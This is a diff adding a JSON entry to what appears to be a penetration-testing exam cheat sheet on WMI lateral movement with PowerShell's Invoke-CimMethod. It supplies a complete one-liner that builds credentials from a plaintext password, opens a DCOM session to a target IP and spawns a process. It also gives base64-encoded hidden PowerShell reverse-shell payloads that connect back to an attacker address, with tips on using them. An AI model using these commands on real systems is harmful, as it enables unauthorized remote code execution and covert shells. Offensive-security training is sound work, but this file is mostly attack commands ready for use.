@@ -1,0 +1,96 @@
+{
+  "commands": [
+    {
+      "id": "ps-wmi-invoke-method",
+      "name": "PowerShell WMI Remote Process Creation",
+      "description": "Create remote process via WMI using Invoke-CimMethod and Win32_Process class",
+      "command": "Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<COMMAND>'}",
+      "category": "LATERAL_MOVEMENT",
+      "subcategory": "WMI",
+      "os": "WINDOWS",
+      "variables": [
+        {
+          "name": "<COMMAND>",
+          "description": "Command to execute on remote system (spawns in session 0 as SYSTEM service)",
+          "example": "calc",
+          "required": true
+        }
+      ],
+      "flags": [
+        {
+          "flag": "-CimSession",
+          "description": "CIM session object created by New-CimSession (contains target and credentials)",
+          "default_value": null
+        },
+        {
+          "flag": "-ClassName Win32_Process",
+          "description": "WMI class for process management (Win32_Process provides Create/Terminate methods)",
+          "default_value": null
+        },
+        {
+          "flag": "-MethodName Create",
+          "description": "WMI method to invoke (Create spawns new process remotely)",
+          "default_value": null
+        },
+        {
+          "flag": "-Arguments @{CommandLine='...'}",
+          "description": "Hashtable of method arguments (CommandLine specifies executable/command to run)",
+          "default_value": null
+        }
+      ],
+      "examples": [
+        {
+          "command": "$u='jen';$p='Nexus123!';$s=ConvertTo-SecureString $p -AsPlaintext -Force;$c=New-Object System.Management.Automation.PSCredential $u,$s;$o=New-CimSessionOption -Protocol DCOM;$ses=New-Cimsession -ComputerName 192.168.50.73 -Credential $c -SessionOption $o;Invoke-CimMethod -CimSession $ses -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='calc'}",
+          "description": "Complete WMI lateral movement one-liner: Create credentials, establish session, spawn calculator on 192.168.50.73",
+          "context": "Full WMI attack from single command"
+        },
+        {
+          "command": "Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...'}",
+          "description": "Execute base64-encoded PowerShell reverse shell via WMI (assuming session already created)",
+          "context": "WMI-based reverse shell lateral movement"
+        },
+        {
+          "command": "$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0A...'; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}",
+          "description": "Store payload in variable first for readability, then execute via WMI",
+          "context": "Cleaner syntax for complex payloads"
+        }
+      ],
+      "educational": {
+        "purpose": "Spawn processes remotely via WMI when WinRM unavailable - processes run in session 0 as SYSTEM context, making them invisible to logged-in users",
+        "manual_alternative": "Deprecated wmic utility: wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create \"<COMMAND>\"",
+        "common_failures": [
+          "Session 0 isolation means GUI apps (calc, notepad) won't be visible to users - only visible in Task Manager",
+          "Return value 0 = success, non-zero = failure (check ProcessId in output to verify)",
+          "Reverse shells must connect back (target initiates connection to attacker listener)",
+          "Firewall blocking high port range (49152-65535) prevents WMI session data transmission"
+        ],
+        "when_to_use": [
+          "WinRM ports (5985/5986) blocked but RPC (135) available",
+          "Need to execute commands without interactive session",
+          "Spawning reverse shells during lateral movement",
+          "Alternative attack vector when WinRM fails"
+        ],
+        "exam_relevance": "MEDIUM - Important backup technique when WinRM unavailable. Demonstrates protocol diversity for lateral movement.",
+        "time_estimate": "5-10 seconds per command execution",
+        "technical_notes": [
+          "Processes created by WMI run as SYSTEM in session 0 (services context)",
+          "WMI uses RPC over port 135 + dynamic high port for session data",
+          "Win32_Process.Create returns ProcessId (PID) and ReturnValue (0=success)"
+        ]
+      },
+      "oscp_priority": "MEDIUM",
+      "tags": [
+        "POWERSHELL",
+        "WMI",
+        "LATERAL_MOVEMENT",
+        "REMOTE_EXECUTION",
+        "OSCP:MEDIUM"
+      ],
+      "related_commands": [
+        "ps-wmi-cimsession-setup",
+        "ps-reverse-shell-base64",
+        "wmic-process-create"
+      ]
+    }
+  ]
+}
